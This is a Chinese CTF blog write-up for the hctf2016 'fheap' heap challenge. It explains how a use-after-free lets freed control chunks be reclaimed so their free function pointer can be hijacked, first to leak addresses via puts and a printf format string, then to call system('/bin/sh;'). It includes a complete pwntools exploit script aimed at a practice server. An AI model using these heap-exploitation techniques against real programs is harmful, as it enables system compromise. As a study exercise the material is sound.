---
title: hctf2016_fheap
tags:
  - 控制堆块
  - UAF
categories: buu刷题
abbrlink: f50f2cd6
---

### 写在前面:

本题为一道经典的控制堆块的题目，对于这类题目通常的方法是将控制堆块申请出来当做用户堆块来使用，向其写入特定数据来篡改其中的函数指针。

### 保护策略：

![image-20221112221838443](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122218987.png)

### 程序分析：

> 一个堆块A中记录了另一个堆块B的地址，而show、edit、delete函数是通过访问堆块A中的堆块B的地址来进行相应的操作，我将这类堆块A称之为控制堆块

本题只有add和delete函数，而delete函数的释放堆块处是通过控制堆块中存放的free函数的指针来实现的。分析add函数后，可以知道控制堆块的结构如下:

![image-20221112222749786](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122227841.png)



本题的libc版本为2.23，存在的漏洞为UAF，程序所申请的控制堆块最终的大小是0x30.



### 利用思路：

通常对于控制堆块相关的题目(要存在UAF漏洞)，我们首先考虑能否将控制堆块给申请出来，通常的策略是将两个控制堆块给释放掉，然后申请一个和控制堆块等大的堆块，加上一个控制堆块，这样原本的两个控制堆块就全出来了，因为UAF漏洞的原因，我们可以往刚申请出来的用户堆块中写入数据(而它还是另一组堆块中的控制堆块)，从而篡改控制堆块中的函数指针。

注意：

1. 首先我们申请堆块的大小是由输入字符串的长度来决定的(如果出现了00会把strlen函数给截断)
2. 申请堆块时，给bss段存的是控制堆块的地址。而这个索引的分配是选择了当前第一个空闲的标志位为0的堆块地址进行分配。举个例子如果我先申请了堆块A和堆块B，然后释放掉堆块A的话，再次申请一个堆块，该控制堆块的地址会覆盖原本堆块A的控制堆块**(而非因为UAF，在堆块B之后分配一个新的地址)**



综上所述，我们做如下布局:

申请堆块A和堆块B(由于输入的数据小于0xf，因此不会创建出来用户堆块，此时堆块A和堆块B为控制堆块)

```py
    add(0x60,'\x00')
    add(0x60,'\x00')
    delete(1)
    delete(0)
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122343486.png" alt="image-20221112234354615" style="zoom:50%;" />



接着我们申请出来一个与控制堆块等大的堆块(如下) 

![image-20221113085209676](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130852198.png)

因此我们可以控制0x555555759030这个堆块里的函数指针(因为它位于bss段，所以还可以被当做控制堆块使用)，原本堆块中就残留了一个函数地址，我们修改后两个字节(爆破半个字节)，写入puts函数的plt地址。来泄露程序基地址(puts函数执行时会将0x18个a以及后面的puts的plt地址全部打印出来)

此时的payload为:

```py
    delete(1)
    delete(0)
    payload=b'a'*0x18+p64(0x4990)
    add(0x60,payload)
    delete(1)
    p.recvuntil("a"*0x18)
    leak_addr=u64(p.recv(6).ljust(8,b'\x00'))
```



而之后的操作，全都如法炮制。去劫持函数指针进行篡改，先泄露libc地址(改函数指针为printf函数的plt表，利用格式化字符串漏洞来泄露libc(只控制printf函数的第一个参数即可))，再控制函数指针为system地址，参数给一个/bin/sh;即可。 使用/bin/sh;而没有使用/bin/sh\x00的原因是因为避免字符串中间出现00使字符串被截断。

### EXP:

```py
from tools import *
#context.log_level='debug'

def add(size,content='/bin/sh\x00'):
    p.sendlineafter("3.quit\n",'create ')
    p.sendlineafter("Pls give string size:",str(size))
    p.sendafter("str:",content)


def delete(index):
    p.sendlineafter("3.quit\n",'delete ')
    p.sendlineafter("Pls give me the string id you want to delete\nid:",str(index))
    p.sendlineafter("Are you sure?:",'yes')

def pwn():
    add(0x60,'\x00')
    add(0x60,'\x00')
    
    delete(1)
    delete(0)
    payload=b'a'*0x18+p64(0x4990)
    add(0x60,payload)
    debug(p,'pie',0xCED,0xCC2,0xE93)
    delete(1)
    p.recvuntil("a"*0x18)
    leak_addr=u64(p.recv(6).ljust(8,b'\x00'))
    log_addr('leak_addr')
    base_addr=leak_addr-0x990
    log_addr('base_addr')

    delete(1)
    delete(0)
    payload=b'%21$p'+b'a'*(0x18-5)+p64(e.plt['printf']+base_addr)
    add(0x60,payload)
    delete(1)
    libc_base=int(p.recv(14),16)-0x78c0f
    log_addr('libc_base')
    sys_addr=libc_base+libc.symbols['system']

    delete(1)
    delete(0)
    payload=b'/bin/sh;'.ljust(0x18,b'a')+p64(sys_addr)
    add(0x60,payload)
    
    delete(1)   
    p.interactive()

while 1:
    try:
        p,e,libc=load("a","node4.buuoj.cn:27051")
        pwn()
    except:
        p.close()
```

![image-20221113091621333](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130916753.png)